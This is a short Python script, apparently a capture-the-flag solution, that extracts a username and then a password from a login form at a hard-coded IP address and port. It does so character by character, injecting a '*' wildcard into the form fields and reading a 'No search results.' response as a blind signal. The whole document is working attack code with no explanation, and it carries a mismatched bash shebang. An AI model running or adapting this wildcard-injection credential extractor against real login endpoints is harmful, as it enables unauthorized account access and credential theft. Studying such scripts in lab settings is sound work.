#!/bin/bash
import requests

letter_list = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&()-=_+[]{};:<>,./?`~|1234567890"

url = 'http://143.110.169.131:32212/login'
obj = {'username': '*', 'password': '*'}
username = ""
password = ""

end = False
while not end:
    end = True
    for letter in letter_list:
        #print(f"{type(result)}\n{type(letter)}")
        obj['username'] = username + letter + '*'
        #print(obj)
        res = requests.post(url, data = obj)
        if "No search results." in res.text:
            end = False
            username += letter
            print(f"cracking in progress: {username}...")
            break

print(f"username: {username}")

obj['username'] = username
end = False
while not end:
    end = True
    for letter in letter_list:
        obj['password'] = password + letter + '*'
        #print(obj)
        res = requests.post(url, data = obj)
        if "No search results." in res.text:
            end = False
            password += letter
            print(f"cracking in progress: {username} {password}...")
            break
print(f"username: {username} password: {password}")
print("done")

    
